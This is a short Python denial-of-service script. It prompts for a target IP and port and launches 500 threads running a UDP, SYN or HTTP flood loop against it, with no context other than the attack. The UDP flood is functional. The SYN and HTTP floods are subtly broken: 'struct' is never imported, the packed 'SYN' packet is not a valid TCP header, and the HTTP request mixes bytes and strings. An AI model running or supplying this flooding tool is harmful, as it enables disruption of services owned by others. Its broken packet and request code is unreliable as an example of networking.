import socket
import threading

target = input("Enter the target IP: ")
port = int(input("Enter the target port: "))

choice = input("Choose an attack method (UDP/SYN/HTTP): ")

def udp_flood(target, port):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(b'', (target, port))

def syn_flood(target, port):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        s.bind((socket.gethostbyname(socket.gethostname()), 0))
        packet = struct.pack('!6s6sH', b'\x00\x00' + socket.inet_aton(target), b'\x08\x00', port)
        s.sendall(packet)

def http_flood(target, port):
    while True:
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.connect((target, port))
        connection.send(b'GET / HTTP/1.1\r\nHost: ' + socket.gethostbyname(socket.gethostname()) + b'\r\n\r\n')

if choice == 'UDP':
    for i in range(500):
        thread = threading.Thread(target=udp_flood, args=(target, port))
        thread.start()

elif choice == 'SYN':
    for i in range(500):
        thread = threading.Thread(target=syn_flood, args=(target, port))
        thread.start()

elif choice == 'HTTP':
    for i in range(500):
        thread = threading.Thread(target=http_flood, args=(target, port))
        thread.start()

else:
    print("Invalid choice. Please choose UDP, SYN, or HTTP.")